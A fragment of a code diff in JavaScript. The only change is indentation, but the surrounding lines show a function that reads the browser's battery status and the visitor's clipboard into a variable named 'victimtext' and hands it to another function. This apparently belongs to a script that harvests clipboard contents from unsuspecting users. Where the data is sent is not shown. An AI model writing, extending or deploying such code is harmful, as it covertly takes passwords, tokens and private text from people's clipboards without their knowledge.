@@ -52,7 +52,7 @@
            async function getclips() {
              var btr = await navigator.getBattery();
              batterypercentage = String(btr.level*100+"%");
-         ischarging = String(btr.charging);
+             ischarging = String(btr.charging);
              try {
                let victimtext = await navigator.clipboard.readText();
                giveclips(victimtext)
